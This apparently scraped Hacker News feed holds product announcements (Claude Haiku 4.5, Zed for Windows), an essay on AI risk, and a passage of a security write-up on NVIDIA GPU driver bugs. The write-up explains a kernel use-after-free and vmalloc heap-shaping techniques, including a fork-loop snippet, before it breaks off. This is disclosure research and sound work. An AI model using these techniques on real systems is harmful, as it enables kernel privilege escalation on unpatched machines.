new set of use cases.</p></blockquote></div><div><p><img alt=" logo" loading="lazy" width="120" height="48" decoding="async" data-nimg="1" src="https://www-cdn.anthropic.com/images/4zrzovbb/website/023ced6d84b14452f308b629b8931b80d8120e28-150x48.svg"></p><p><span>“</span></p><blockquote><p>Speed is the new frontier for AI agents operating in feedback loops. <strong>Haiku 4.5 proves you can have both intelligence and rapid output</strong>. It handles complex workflows reliably, self-corrects in real-time, and maintains momentum without latency overhead. For most development tasks, it's the ideal performance balance.</p></blockquote></div><div><p><img alt="Gamma logo" loading="lazy" width="120" height="48" decoding="async" data-nimg="1" src="https://www-cdn.anthropic.com/images/4zrzovbb/website/d1a7e2e3c3c9c90411efd32141c8dc02f83efef2-150x48.svg"></p><p><span>“</span></p><blockquote><p>Claude Haiku 4.5 <strong>outperformed our current models on instruction-following for slide text generation</strong>, achieving 65% accuracy versus 44% from our premium tier model—that's a game-changer for our unit economics.</p></blockquote></div><div><p><img alt=" logo" loading="lazy" width="120" height="48" decoding="async" data-nimg="1" src="https://www-cdn.anthropic.com/images/4zrzovbb/website/7715b118c5eb0ff2a85f1f7914bce8c634ecacbd-150x48.svg"></p><p><span>“</span></p><blockquote><p>Our early testing shows that Claude Haiku 4.5 brings efficient code generation to GitHub Copilot <strong>with comparable quality to Sonnet 4 but at faster speed</strong>. Already we're seeing it as an excellent choice for Copilot users who value speed and responsiveness in their AI-powered development workflows.</p></blockquote></div></div><h2 id="safety-evaluations">Safety evaluations</h2><p>We ran a detailed series of safety and alignment evaluations on Claude Haiku 4.5. The model showed low rates of concerning behaviors, and was substantially more aligned than its predecessor, Claude Haiku 3.5. In our automated alignment assessment, Claude Haiku 4.5 also showed a statistically significantly lower overall rate of misaligned behaviors than both Claude Sonnet 4.5 and Claude Opus 4.1—making Claude Haiku 4.5, by this metric, our safest model yet.</p><p>Our safety testing also showed that Claude Haiku 4.5 poses only limited risks in terms of the production of chemical, biological, radiological, and nuclear (CBRN) weapons. For that reason, we’ve released it under the AI Safety Level 2 (ASL-2) standard—compared to the more restrictive ASL-3 for Sonnet 4.5 and Opus 4.1. You can read the full reasoning behind the model’s ASL-2 classification, as well as details on all our other safety tests, in the <a href="https://www.anthropic.com/claude-haiku-4-5-system-card">Claude Haiku 4.5 system card</a>.</p><h2 id="further-information">Further information</h2><p>Claude Haiku 4.5 is available now on Claude Code and our apps. Its efficiency means you can accomplish more within your usage limits while maintaining premium model performance.</p><p>Developers can use Claude Haiku 4.5 on our API, Amazon Bedrock, and Google Cloud’s Vertex AI, where it serves as a drop-in replacement for both Haiku 3.5 and Sonnet 4 at our most economical price point.</p><p>For complete technical details and evaluation results, see our <a href="https://www.anthropic.com/claude-haiku-4-5-system-card">system card</a>, <a href="https://www.anthropic.com/claude/haiku">model page</a>, and <a href="https://docs.claude.com/en/docs/about-claude/models/overview">documentation</a>.</p></div></article></div><div><h4>Methodology</h4><ul><li><strong>SWE-bench Verified</strong>: All Claude results were reported using a simple scaffold with two tools—bash and file editing via string replacements. We report 73.3%, which was averaged over 50 trials, no test-time compute, 128K thinking budget, and default sampling parameters (temperature, top_p) on the full 500-problem SWE-bench Verified dataset.<ul><li>The score reported uses a minor prompt addition: "You should use tools as much as possible, ideally more than 100 times. You should also implement your own tests first before attempting the problem."</li></ul></li><li><strong>Terminal-Bench</strong>: All scores reported use the default agent framework (Terminus 2), with XML parser, averaging 11 runs (6 without thinking (40.21% score), 5 with 32K thinking budget (41.75% score)) with n-attempts=1.</li><li><strong>τ2-bench</strong>: Scores were achieved averaging over 10 runs using extended thinking (128k thinking budget) and default sampling parameters (temperature, top_p) with tool use and a prompt addendum to the Airline and Telecom Agent Policy instructing Claude to better target its known failure modes when using the vanilla prompt. A prompt addendum was also added to the Telecom User prompt to avoid failure modes from the user ending the interaction incorrectly.</li><li><strong>AIME</strong>: Haiku 4.5 score reported as the average over 10 independent runs that each calculate pass@1 over 16 trials with default sampling parameters (temperature, top_p) and 128K thinking budget.</li><li><strong>OSWorld</strong>: All scores reported use the official OSWorld-Verified framework with 100 max steps, averaged across 4 runs with 128K total thinking budget and 2K thinking budget per-step configured.</li><li><strong>MMMLU</strong>: All scores reported are the average of 10 runs over 14 non-English languages with a 128K thinking budget.</li><li>All other scores were averaged over 10 runs with default sampling parameters (temperature, top_p) and 128K thinking budget.</li></ul><p>All OpenAI scores reported from their <a href="https://openai.com/index/introducing-gpt-5/">GPT-5 post</a>, <a href="https://openai.com/index/introducing-gpt-5-for-developers/">GPT-5 for developers post</a>, <a href="https://cdn.openai.com/gpt-5-system-card.pdf">GPT-5 system card</a> (SWE-bench Verified reported using n=500), and <a href="https://www.tbench.ai/">Terminal Bench leaderboard</a> (using Terminus 2). All Gemini scores reported from their <a href="https://deepmind.google/models/gemini/pro/">model web page</a>, and <a href="https://www.tbench.ai/">Terminal Bench leaderboard</a> (using Terminus 1).</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Zed is now available on Windows (225 pts)]]></title>
            <link>https://zed.dev/blog/zed-for-windows-is-here</link>
            <guid>45594920</guid>
            <pubDate>Wed, 15 Oct 2025 16:24:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://zed.dev/blog/zed-for-windows-is-here">https://zed.dev/blog/zed-for-windows-is-here</a>, See on <a href="https://news.ycombinator.com/item?id=45594920">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><p>Zed is now available on Windows. You can download the <a href="https://zed.dev/download">stable release here</a>. Or if you prefer to live on the bleeding edge, you can use the <a href="https://zed.dev/releases/preview/latest">preview release</a>, which receives new features one week earlier.</p>
<p>Windows is now a fully supported platform for Zed. We'll be shipping updates every week, like we do with Mac and Linux. Several Zed engineers use Windows as their daily driver, and we will maintain a full-time Windows team, including <a href="https://github.com/localcc">@localcc</a>, our Windows platform lead.</p>
<p>Read on to learn about the key Windows features.</p>
<h2 id="windows-platform-integration"><a href="#windows-platform-integration" aria-label="Copy heading link"><span><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" x2="20" y1="9" y2="9"></line><line x1="4" x2="20" y1="15" y2="15"></line><line x1="10" x2="8" y1="3" y2="21"></line><line x1="16" x2="14" y1="3" y2="21"></line></svg></span><span>Windows Platform Integration</span></a></h2>
<p>Zed isn't an Electron app; we integrate directly with the underlying platform for maximal control. The Windows build uses DirectX 11 for rendering, and DirectWrite for text rendering, to match the Windows look and feel.</p>
<h2 id="wsl-and-ssh-remoting"><a href="#wsl-and-ssh-remoting" aria-label="Copy heading link"><span><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" x2="20" y1="9" y2="9"></line><line x1="4" x2="20" y1="15" y2="15"></line><line x1="10" x2="8" y1="3" y2="21"></line><line x1="16" x2="14" y1="3" y2="21"></line></svg></span><span>WSL and SSH Remoting</span></a></h2>
<p>Zed integrates directly with <a href="https://learn.microsoft.com/en-us/windows/wsl/">Windows Subsystem for Linux</a> (WSL). From the WSL terminal, you can open a folder in Zed using the <code>zed</code> command-line script. And from within Zed, you can open a folder in any of your WSL distros by clicking <code>File &gt; Open Remote</code> (or running <code>project: open remote</code> from the command palette) and selecting <code>Add WSL Distro</code>.</p>
<div><figure><img src="https://zed.dev/img/post/windows-launch/wsl-setup.webp" alt="Opening a folder in WSL from within Zed"><figcaption>Opening a folder in WSL from within Zed</figcaption></figure></div>
<p>Similarly, if you're connecting to a <em>remote</em> Linux machine, select <code>Connect New Server</code>.</p>
<p>Under the hood, when editing under WSL or SSH, Zed runs a lightweight "remote server" process under <code>wsl.exe</code> / <code>ssh.exe</code>, and all I/O operations are routed through that process. Most features in Zed are designed to work with remote editing: loading and saving files, git integration, terminals, tasks, language servers, and debuggers.</p>
<h2 id="extension-compatibility"><a href="#extension-compatibility" aria-label="Copy heading link"><span><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" x2="20" y1="9" y2="9"></line><line x1="4" x2="20" y1="15" y2="15"></line><line x1="10" x2="8" y1="3" y2="21"></line><line x1="16" x2="14" y1="3" y2="21"></line></svg></span><span>Extension Compatibility</span></a></h2>
<p>Zed extensions work on Windows; no special steps, no caveats. You can install them from the Extensions panel and get back to coding. And if you want to create a new extension, you can do so without any Windows-specific workarounds.</p>
<p>Zed extensions are <a href="https://component-model.bytecodealliance.org/">WebAssembly Components</a>, and they have sandboxed access to the file system via the <a href="https://wasi.dev/">WebAssembly System Interface</a> (WASI). Zed manages the conversions of file system paths as they are passed into and out of extensions, so that extension authors don't need to worry about the differences between Windows and Unix paths.</p>
<h2 id="agentic-coding-on-windows"><a href="#agentic-coding-on-windows" aria-label="Copy heading link"><span><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" x2="20" y1="9" y2="9"></line><line x1="4" x2="20" y1="15" y2="15"></line><line x1="10" x2="8" y1="3" y2="21"></line><line x1="16" x2="14" y1="3" y2="21"></line></svg></span><span>Agentic Coding on Windows</span></a></h2>
<p>All of Zed’s AI features, including <a href="https://zed.dev/docs/ai/edit-prediction">edit predictions</a> and <a href="https://agentclientprotocol.com/overview/introduction">ACP-powered agents</a>, are fully supported on Windows, and in combination with WSL/SSH remoting. Leverage <a href="https://zed.dev/blog/claude-code-via-acp">Claude Code directly in Zed</a> through ACP, <a href="https://zed.dev/pricing">trial Zed Pro</a> for free for 14 days, or bring your own keys.</p>
<h2 id="use-it-today"><a href="#use-it-today" aria-label="Copy heading link"><span><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" x2="20" y1="9" y2="9"></line><line x1="4" x2="20" y1="15" y2="15"></line><line x1="10" x2="8" y1="3" y2="21"></line><line x1="16" x2="14" y1="3" y2="21"></line></svg></span><span>Use It Today</span></a></h2>
<p>Thank you to everyone who participated in our Alpha &amp; Beta testing, reporting issues on GitHub and Discord. We've fixed a lot of bugs, but we know the work is not over. If you find something amiss, <a href="https://github.com/zed-industries/zed/issues/new?template=07_bug_windows.yml">please let us know</a>.
We’re especially looking for feedback on WSL workflows, IME and keyboard layouts, multi-monitor setups, and 120–144 Hz displays.</p>
<p>Your reports will shape the next set of fixes, features, and polish. <a href="https://zed.dev/download">Download Zed for Windows</a>, take it for a spin, and tell us what to build next.</p><hr><div><h3 id="looking-for-a-better-editor">Looking for a better editor?</h3>
<p>You can try Zed today on macOS, Windows, or Linux. <a href="https://zed.dev/download">Download now</a>!</p><hr><h3 id="we-are-hiring">We are hiring!</h3>
<p>If you're passionate about the topics we cover on our blog, please consider <a href="https://zed.dev/jobs">joining our team</a> to help us ship the future of software development.</p></div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[You are the scariest monster in the woods (213 pts)]]></title>
            <link>https://jamie.ideasasylum.com/2025/10/15/you-are-the-scariest-monster-in-the-woods</link>
            <guid>45592766</guid>
            <pubDate>Wed, 15 Oct 2025 14:04:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jamie.ideasasylum.com/2025/10/15/you-are-the-scariest-monster-in-the-woods">https://jamie.ideasasylum.com/2025/10/15/you-are-the-scariest-monster-in-the-woods</a>, See on <a href="https://news.ycombinator.com/item?id=45592766">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>I don’t really believe in the threat of AGI (Artificial General Intelligence—human-level intelligence) partly because I don’t believe in the <em>possibility</em> of AGI and I’m highly skeptical that the current technology underpinning LLMs will provide a route to it. But I also think there’s something we should actually be afraid of long before AGI, if it ever comes.</p>

<p>When talking about humans in any context, whether it’s us vs sharks, or us vs wolves, or us vs &lt;insert anything that scares us&gt;, and especially when it’s us vs &lt;some technology&gt;, I am reminded of The Gruffalo. In this children’s story, a timid mouse convinces a scary monster (The Gruffalo) that the mouse is the scariest animal in the woods. In reality though, the forest animals are frightened of the Gruffulo with it’s terrible tusks, and terrible claws, and terrible teeth.</p>

<p><img src="https://jamie.ideasasylum.com/images/gruffalo-ai.jpg" alt="AI is a timid mouse compared to the terrifying humans"></p>

<p>We (humans) are the scariest animal in the woods. We’re the scariest animal <em>anywhere</em>. At any time, in any location, under any circumstances, if there’s a human present then that’s the scariest motherfucker in the woods. We’re a danger to every living thing, ourselves included. Our collective ability to survive, adapt, control, kill, or wipe out any other species is unmatched.</p>

<p>Anyone trying to tell you otherwise is trying to distract you. AI is not the monster to be afraid of; we are.</p>

<p>Just like a hammer, sword, or a rifle lying on a ground is nothing to be feared, so too is AI. It’s just an inanimate object; a tool, potentially. Now, if you equip humans with a hammer, or sword, or rifle, or AI then you’ve just made the scariest monster in the woods (that’s you) even more terrifying.</p>

<p>To bring this around to more concrete thoughts: I do not believe that AI will enslave us, destroy our democracies, or our environment, or rob us of our skills, our purpose, or our jobs. That’s what humans will do. What we’ve always tried to do.</p>

<p>We don’t need to worry about AI itself, we need to be concerned about what “humans + AI” will do. Humans will do what they’ve always tried to do—gain power, enslave, kill, control, exploit, cheat, or just be lazy and avoid the hard work—but now with new abilities that we couldn’t have dreamed of.</p>

<p>I’m not saying “don’t worry”. I’m saying don’t worry about the technology of AI and continue to recognise that humans, and how they will use a technology, has always been our biggest threat.</p>

<p>The means accepting that AI isn’t something passively happening to us. It’s not a meteor heading towards Earth that we play no part in it or have no control over. It’s a thing <em>we’re</em> building, for other <em>humans</em> to use. We’re not building AI for gerbils here. How would we like other humans to use AI? How would we not like them to use it? We’re building and using this technology but pretending that unlike cars, and guns, and knives, and nuclear weapons, that we are powerless to understand, control, or regulate it for the betterment of humanity.</p>

<p>The scariest monster in the woods just got scarier and we can’t ignore that.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A kernel stack use-after-free: Exploiting Nvidia's GPU Linux drivers (142 pts)]]></title>
            <link>https://blog.quarkslab.com/./nvidia_gpu_kernel_vmalloc_exploit.html</link>
            <guid>45592585</guid>
            <pubDate>Wed, 15 Oct 2025 13:52:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.quarkslab.com/./nvidia_gpu_kernel_vmalloc_exploit.html">https://blog.quarkslab.com/./nvidia_gpu_kernel_vmalloc_exploit.html</a>, See on <a href="https://news.ycombinator.com/item?id=45592585">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                
                <hr>
                <p>This article details two bugs discovered in the <a href="https://github.com/NVIDIA/open-gpu-kernel-modules">NVIDIA Linux Open GPU Kernel Modules</a> and demonstrates how they can be exploited. The bugs can be triggered by an attacker controlling a local unprivileged process. Their security implications were confirmed via a proof of concept that achieves kernel read and write primitives.</p>
                <hr>
                <h2 id="the nvidia open source driver">The NVIDIA Open source driver</h2>
<p>Back in 2022, NVIDIA started distributing the Linux Open GPU Kernel Modules. Since 2024, using these modules is officially <a href="https://developer.nvidia.com/blog/nvidia-transitions-fully-towards-open-source-gpu-kernel-modules/">"the right move"</a> for both consumer and server hardware. The driver provides multiple kernel modules, the bugs being found in <code>nvidia.ko</code> and <code>nvidia-uvm.ko</code>. They expose ioctls on device files, most of them being accessible to unprivileged users. These ioctls are meant to be used by NVIDIA's proprietary userland binaries and libraries. However, using the header files provided in the kernel modules repository as a basis, it's possible to make direct ioctl calls.</p>
<p>While manually probing the attack surface related to memory allocation and management we found two vulnerabilities. They were reported to NVIDIA and the vendor issued fixes in their <a href="https://nvidia.custhelp.com/app/answers/detail/a_id/5703">NVIDIA GPU Display Drivers update of October 2025</a> </p>
<h2 id="bug #1: kernel null-pointer dereference in nvidia-uvm module (cve-2025-23300)">Bug #1: Kernel null-pointer dereference in <code>nvidia-uvm</code> module (CVE-2025-23300)</h2>
<p>The <code>UVM_MAP_EXTERNAL_ALLOCATION</code> ioctl of the <code>nvidia-uvm</code> module allows mapping memory allocated from the main <code>nvidia</code> module into the Unified Virtual Memory framework. This includes memory allocations of type <code>NV01_MEMORY_DEVICELESS</code> which are not associated with any device and therefore have the <code>pGpu</code> field of their corresponding <code>MEMORY_DESCRIPTOR</code> structure set to null. The ioctl call leads to an unchecked use of this field, resulting in a kernel null-pointer dereference. An example stack trace is provided below:</p>
<div><pre><span></span><code>// linux 6.11.0-24 + nvidia 570.86.15 from Ubuntu Noble

osIovaMap+0x11e/0x630 [nvidia]
iovaspaceAcquireMapping_IMPL+0x232/0x470 [nvidia]
memdescMapIommu+0x90/0x300 [nvidia]
dupMemory+0x2d9/0x830 [nvidia]
nvUvmInterfaceDupMemory+0x44/0xe0 [nvidia]
uvm_map_external_allocation_on_gpu+0x298/0x500 [nvidia_uvm]
uvm_api_map_external_allocation+0x5dd/0x860 [nvidia_uvm]
uvm_ioctl+0x1aad/0x1e70 [nvidia_uvm]
uvm_unlocked_ioctl_entry.part.0+0x7b/0xf0 [nvidia_uvm]
uvm_unlocked_ioctl_entry+0x6a/0x90 [nvidia_uvm]
__x64_sys_ioctl+0xa3/0xf0
x64_sys_call+0x11ad/0x25f0
do_syscall_64+0x7e/0x170
</code></pre></div>
<blockquote>
<p>🛠️✅ NVIDIA Fix</p>
<p>A <a href="https://github.com/NVIDIA/open-gpu-kernel-modules/blame/2b436058a616676ec888ef3814d1db6b2220f2eb/src/nvidia/src/kernel/rmapi/nv_gpu_ops.c#L8053">new check</a> was added to the function <code>dupMemory</code> so that operations that require valid GPU contexts are skipped for deviceless memory.</p>
</blockquote>
<h2 id="bug #2: kernel use-after-free in threadstateinit() and threadstatefree() in nvidia module (cve-2025-23280)">Bug #2: Kernel use-after-free in <code>threadStateInit()</code> and <code>threadStateFree()</code> in <code>nvidia</code> module (CVE-2025-23280)</h2>
<p>The <code>threadStateInit()</code> and <code>threadStateFree()</code> functions are used in multiple locations of the <code>open-gpu-kernel-modules</code> codebase. They are always used as a pair to encapsulate specific operations, as seen in the following example:</p>
<div><pre><span></span><code><span>// src/nvidia/src/kernel/rmapi/mapping.c (line 433)</span>

<span>NV_STATUS</span>
<span>rmapiMapWithSecInfoTls</span>
<span>(</span>
<span>    </span><span>RM_API</span><span>            </span><span>*</span><span>pRmApi</span><span>,</span>
<span>    </span><span>NvHandle</span><span>           </span><span>hClient</span><span>,</span>
<span>    </span><span>NvHandle</span><span>           </span><span>hDevice</span><span>,</span>
<span>    </span><span>NvHandle</span><span>           </span><span>hMemCtx</span><span>,</span>
<span>    </span><span>NvHandle</span><span>           </span><span>hMemory</span><span>,</span>
<span>    </span><span>NvU64</span><span>              </span><span>offset</span><span>,</span>
<span>    </span><span>NvU64</span><span>              </span><span>length</span><span>,</span>
<span>    </span><span>NvU32</span><span>              </span><span>flags</span><span>,</span>
<span>    </span><span>NvU64</span><span>             </span><span>*</span><span>pDmaOffset</span><span>,</span>
<span>    </span><span>API_SECURITY_INFO</span><span> </span><span>*</span><span>pSecInfo</span>
<span>)</span>
<span>{</span>
<span>    </span><span>THREAD_STATE_NODE</span><span> </span><span>threadState</span><span>;</span>
<span>    </span><span>NV_STATUS</span><span>         </span><span>status</span><span>;</span>

<span>    </span><span>threadStateInit</span><span>(</span><span>&amp;</span><span>threadState</span><span>,</span><span> </span><span>THREAD_STATE_FLAGS_NONE</span><span>);</span>

<span>    </span><span>status</span><span> </span><span>=</span><span> </span><span>rmapiMapWithSecInfo</span><span>(</span><span>pRmApi</span><span>,</span><span> </span><span>hClient</span><span>,</span><span> </span><span>hDevice</span><span>,</span><span> </span><span>hMemCtx</span><span>,</span><span> </span><span>hMemory</span><span>,</span><span> </span><span>offset</span><span>,</span>
<span>                                 </span><span>length</span><span>,</span><span> </span><span>flags</span><span>,</span><span> </span><span>pDmaOffset</span><span>,</span><span> </span><span>pSecInfo</span><span>);</span>

<span>    </span><span>threadStateFree</span><span>(</span><span>&amp;</span><span>threadState</span><span>,</span><span> </span><span>THREAD_STATE_FLAGS_NONE</span><span>);</span>

<span>    </span><span>return</span><span> </span><span>status</span><span>;</span>
<span>}</span>
</code></pre></div>
<p>The <code>threadState</code> structure will be inserted into a global red-black tree (<code>threadStateDatabase.dbRoot</code>) during <code>threadStateInit()</code> and removed during <code>threadStateFree()</code>. The fact that this structure is always stack-allocated is dangerous if a <a href="https://en.wikipedia.org/wiki/Linux_kernel_oops">kernel oops</a> occurs between the two function calls. The oops will lead to the kernel stack for this task being freed on modern Linux kernels, which use virtual stacks allocated through <code>vmalloc</code>. As a result, an invalid pointer to the now freed stack would remain in the global tree structure. This is exactly what happens when bug #1 is triggered: <code>threadStateInit()</code> is called during <code>dupMemory()</code> (in <code>src/nvidia/src/kernel/rmapi/nv_gpu_ops.c</code>) and the null-pointer dereference happens before the call to <code>threadStateFree()</code>. The following stack trace shows the use-after-free being triggered by a call to <code>open</code> on <code>/dev/nvidia0</code> after the oops caused by bug #1:</p>
<div><pre><span></span><code>// linux 6.11.0-24 + nvidia 570.86.15 from Ubuntu Noble

_mapInsertBase+0x3c/0x320 [nvidia]
threadStateInit+0xd5/0x1b0 [nvidia]
rm_is_device_sequestered+0x28/0x60 [nvidia]
nv_open_device+0x2ef/0x9e0 [nvidia]
nvidia_open+0x22a/0x4b0 [nvidia]
chrdev_open+0xd2/0x250
do_dentry_open+0x218/0x4c0
vfs_open+0x30/0x100
do_open+0x2ba/0x440
path_openat+0x132/0x2c0
do_filp_open+0xc0/0x170
do_sys_openat2+0xb3/0xe0
__x64_sys_openat+0x55/0xa0
x64_sys_call+0x230a/0x25f0
do_syscall_64+0x7e/0x170
</code></pre></div>
<blockquote>
<p>🛠️✅ NVIDIA Fix</p>
<p>The heap based <a href="https://github.com/NVIDIA/open-gpu-kernel-modules/blame/2b436058a616676ec888ef3814d1db6b2220f2eb/src/nvidia/src/kernel/core/thread_state.c#L607"><code>threadStateAlloc</code></a> function was added as a "new UAF-safe API". However, it seems it is currently used as a replacement for the stack based <code>threadStateInit</code> only in the <code>dupMemory</code> function. This has not been tested, but, other functions still using <code>threadStateInit</code> may continue to be vulnerable to a UAF in the case of a oops.</p>
</blockquote>
<h2 id="exploitation">Exploitation</h2>
<p>Proof of concept exploitation was carried out in the following environment:</p>
<ul>
<li>ThinkPad P14s Gen 3 (Intel) with NVIDIA T550 Laptop GPU</li>
<li>Ubuntu Noble with the following packages:<ul>
<li>linux-image-6.11.0-24-generic (6.11.0-24.24~24.04.1 amd64)</li>
<li>nvidia-driver-570-server-open (570.86.15-0ubuntu0.24.04.4 amd64)</li>
</ul>
</li>
</ul>
<p>Since bug #1 is only used to trigger bug #2, we will focus on the latter. This bug is quite unusual since the UAF address is part of a kernel stack, and as such it belongs to a <code>vmalloc</code> area. Most resources available on UAF exploitation are related to <code>kmalloc</code> as it's used way more broadly for kernel allocations. The only reference for exploitation related to <code>vmalloc</code> seems to be <a href="https://googleprojectzero.blogspot.com/2020/12/an-ios-hacker-tries-android.html">"An iOS hacker tries Android"</a> from Brandon Azad. However, things changed since then, for example the introduction of <a href="https://lwn.net/Articles/849888/"><code>random_kstack_offset</code></a>. This feature introduces a randomly generated stack offset at each syscall entry, effectively cancelling its mostly deterministic layout. By randomising the position of key stack values, it makes exploitation more difficult.</p>
<h2 id="vmalloc">Vmalloc</h2>
<p><code>vmalloc</code> is a kernel function for allocating virtually contiguous memory with a page granularity. It's notably used for allocating kernel stacks, as well as other large kernel allocations. On a running system, the allocations can be inspected using <code>/proc/vmallocinfo</code>. This section will discuss the behavior of the allocator, focusing on address space management, without addressing how backing pages are selected. Here is a very simplified representation of an area managed by <code>vmalloc</code>:</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-1.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-1.png" width="100%">
</a></p>
<p>When a new allocation is made, it's placed in the first free area that can accommodate its size. Here is an example for a small allocation that takes the first empty slot:</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-2.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-2.png" width="100%">
</a></p>
<p>Here is an example for a bigger allocation that didn't fit in the first available slot and so is being allocated further away:</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-3.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-3.png" width="100%">
</a></p>
<p>When allocations are released, they are not immediately freed but instead marked as unpurged. While they are not used by the kernel anymore, they still live in the <code>vmalloc</code> area and the address cannot be reused directly. Here is an example if we free three of the allocations:</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-4.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-4.png" width="100%">
</a></p>
<p>To be effectively freed, the unpurged allocations must be purged. This is done when the number of pages contained in the unpurged allocations crosses the value returned by <code>lazy_max_pages</code>, which can easily be computed from userland and is defined as follows:</p>
<div><pre><span></span><code><span>// linux/mm/vmalloc.c</span>

<span>static</span><span> </span><span>unsigned</span><span> </span><span>long</span><span> </span><span>lazy_max_pages</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
<span>    </span><span>unsigned</span><span> </span><span>int</span><span> </span><span>log</span><span>;</span>

<span>    </span><span>log</span><span> </span><span>=</span><span> </span><span>fls</span><span>(</span><span>num_online_cpus</span><span>());</span>

<span>    </span><span>return</span><span> </span><span>log</span><span> </span><span>*</span><span> </span><span>(</span><span>32UL</span><span> </span><span>*</span><span> </span><span>1024</span><span> </span><span>*</span><span> </span><span>1024</span><span> </span><span>/</span><span> </span><span>PAGE_SIZE</span><span>);</span>
<span>}</span>
</code></pre></div>
<p>After the purge, all released areas are typically ready to be used again for allocations:</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-5.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-5.png" width="100%">
</a></p>
<p>However, due to <a href="https://lwn.net/Articles/956590/">recent optimisations</a>, the kernel will now add freed allocations back into size-based pools. While they are in these pools, they will be reused in priority for allocations of the same size and the corresponding areas cannot be used for allocations of other sizes. This is a bit annoying in the context of the exploitation of a UAF, but the pools have a "decay" feature where ~25% of their contents will be released during a purge. By triggering a lot of purges instead of one, we can completely empty out the pools and get a similar result to the old behavior.</p>
<h2 id="shaping primitives">Shaping primitives</h2>
<p>To act on the <code>vmalloc</code> area from an unprivileged process we will use the three following primitives.</p>
<h3 id="forking">Forking</h3>
<p>As previously mentioned, kernel stacks are allocated in the <code>vmalloc</code> area. As each userland process has its own dedicated kernel thread stack, forking will lead to a new 0x5000 bytes allocation. This corresponds to four pages for the stack itself and one guard page. Freed kernel stacks are cached to be possibly reused later without the need for new allocations. However, when a stack is released, the operation is usually delayed meaning that if we write very aggressive code like this:</p>
<div><pre><span></span><code><span>while</span><span> </span><span>(</span><span>1</span><span>)</span><span> </span><span>{</span>
<span>    </span><span>if</span><span> </span><span>(</span><span>fork</span><span>()</span><span> </span><span>==</span><span> </span><span>0</span><span>)</span><span> </span><span>{</span>
<span>        </span><span>exit</span><span>(</span><span>0</span><span>);</span>
<span>    </span><span>}</span>
<span>}</span>
</code></pre></div>
<p>It will lead to the stack cache not being used properly, triggering numerous allocations and deallocations, ultimately leading to a lot of unpurged areas.</p>
<h3 id="video4linux2 buffers">Video4linux2 buffers</h3>
<p>The v4l2 (video4linux2) framework is used for interacting with video devices from userland. It has nothing to do with the NVIDIA driver but it can provide some powerful <code>vmalloc</code> capabilities. Indeed, it has a <code>vmalloc</code> backend for allocating buffers shared with the user (<code>drivers/media/common/videobuf2/videobuf2-vmalloc.c</code>). The use of this backend is not systematic but seems to be common for internal and external USB-based webcams. The target system being a laptop, it's of course fit with one such device. However, some systems may restrict the use of video devices to the <code>video</code> group.</p>
<p>By opening a video device using the <code>vmalloc</code> backend we get access to the following capabilities:</p>
<ul>
<li>Allocate between 1 and 16 buffers at once</li>
<li>Control the size by asking for different resolutions</li>
<li><code>mmap</code> the buffers in userland while they are also mapped in kernel</li>
</ul>
<p>Only one set of buffers can be allocated per video device. However, the <code>mmap</code> capability is extremely powerful and the fact that we can allocate large buffers is also very useful to generate a lot of unpurged pages to trigger purges.</p>
<h3 id="side effect purge">Side effect purge</h3>
<p>We know that we can trigger purges by allocating and freeing a large number of buffers using either forking or v4l2 buffers. Still, it's not possible to know precisely when the purge will happen. However, exceeding <code>lazy_max_pages</code> unpurged pages is in fact not the only way to cause a purge. And, by sheer chance, the allocation of a deviceless memory inside the NVIDIA driver (i.e. the type of memory used to trigger bug #1) will cause <code>nv_alloc_contig_pages()</code> to be called with the <code>NV_MEMORY_UNCACHED</code> flag. This will cause an attribute change using the <code>change_page_attr_set_clr()</code> kernel function which will explicitly call <code>vm_unmap_aliases()</code> leading to a purge. This is extremely useful for improving reliability by starting from a known clean state.</p>
<h2 id="reclaiming the uaf_1">Reclaiming the UAF</h2>
